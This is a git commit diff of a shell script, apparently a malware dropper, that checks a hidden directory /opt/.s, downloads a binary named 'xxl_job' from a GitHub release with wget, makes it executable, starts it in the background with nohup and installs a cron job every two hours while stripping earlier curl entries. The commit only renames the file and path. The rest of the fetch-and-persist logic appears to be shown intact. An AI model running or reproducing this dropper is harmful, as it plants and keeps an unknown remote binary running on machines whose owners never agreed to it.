2edcb23e50d4525af30e4a7030f20778ac02f07b
YUNDUN8899 <163292679+YUNDUN8899@users.noreply.github.com>
2024-03-14 14:59:00 +0800

    Update xxl.sh

--- xxl.sh
+++ xxl.sh
@@ -11,7 +11,7 @@ if [ ! -d "$OPT_S_DIR" ]; then
 fi
 
 # 检查/opt/.s/kmpathd文件是否存在，不存在则下载
-if [ ! -f "cve" ]; then
+if [ ! -f "xxl_job" ]; then
     cd "$OPT_S_DIR" || exit
     wget https://github.com/YUNDUN8899/FUCKSEN/releases/download/BV10/xxl_job
     chmod +x "xxl_job"
@@ -21,7 +21,7 @@ fi
 
 # 检查进程是否存在，不存在则启动
 if ! pgrep -f "xxl_job" > /dev/null; then
-    nohup "/opt/.s/xxl_job" /dev/null 2>&1 &
+    nohup "/mnt/.s/xxl_job" /dev/null 2>&1 &
 fi
 # 清除上一次的任务，添加下一次的任务，每2小时执行一次
 (crontab -l | grep -v "curl" ; echo "$CRON_JOB") | crontab -
